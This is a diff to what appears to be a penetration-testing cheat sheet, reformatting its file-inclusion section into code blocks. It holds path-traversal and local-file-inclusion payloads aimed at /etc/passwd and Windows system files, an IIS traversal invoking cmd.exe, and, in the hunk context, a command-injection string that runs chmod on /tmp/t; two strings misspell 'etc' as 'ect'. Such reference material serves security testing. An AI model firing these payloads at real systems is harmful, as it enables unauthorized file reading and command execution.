@@ -40,15 +40,25 @@ http://victim/file?arg=$({chmod,+x,/tmp/t})
 
 > **File Inclusion**
 
-**Test Strings:**
+**Linux Test Strings:**
 
-Linux Test String 1 | <code> http://website/?p=file%3a%2f%2f%2fetc%2fpasswd </code>
-Linux Test String 2 | <code> /ect/passwd </code>
-Linux Test String 3 | <code> ../../../../../../../../../../../../../../ect/passwd </code>
-Windows IIS 1 | <code> ../../../winnt/system32.cmd.exe+/c+dir (not frequent) </code>
-Windows Test String 1 | <code> %WINDIR%\win.ini </code>
-Windows Test String 2 | <code> %SYSTEMDRIVE%\boot.ini //note only older versions of windows </code>
+{% highlight bash %}
+http://website/?p=file%3a%2f%2f%2fetc%2fpasswd
 
+/ect/passwd
+
+ ../../../../../../../../../../../../../../ect/passwd 
+{% endhighlight %}
+
+**Windows Test Strings:**
+
+{% highlight bash %}
+../../../winnt/system32.cmd.exe+/c+dir (not frequent) </code>
+
+%WINDIR%\win.ini 
+
+%SYSTEMDRIVE%\boot.ini //note only older versions of windows </code>
+{% endhighlight %}
 
 **What to go after - Linux:**
 * /etc/passwd
